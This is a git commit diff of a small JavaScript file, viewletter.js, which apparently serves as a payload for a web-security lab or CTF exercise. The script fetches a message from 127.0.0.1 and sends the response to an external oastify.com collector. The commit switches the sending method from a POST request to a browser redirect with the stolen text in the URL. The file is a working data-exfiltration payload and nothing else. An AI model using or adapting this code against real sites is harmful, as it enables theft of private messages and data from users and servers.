1093986bbb6209aa0cd1d7c56ef5551babed55fb
Naveenholla3 <naveenhn.hn@gmail.com>
2022-09-22 00:30:12 +0530

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -2,9 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.open('GET', 'http://127.0.0.1/message/3');
 xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
-        var xhr1 = new XMLHttpRequest();
-        xhr1.open('POST', 'http://betn02sdx7csylo9baybdpwuyl4cs1.oastify.com');
-        xhr1.send(xhr.responseText);
+        window.location = 'http://betn02sdx7csylo9baybdpwuyl4cs1.oastify.com/q='+xhr.responseText;
     }
 }
 xhr.send();
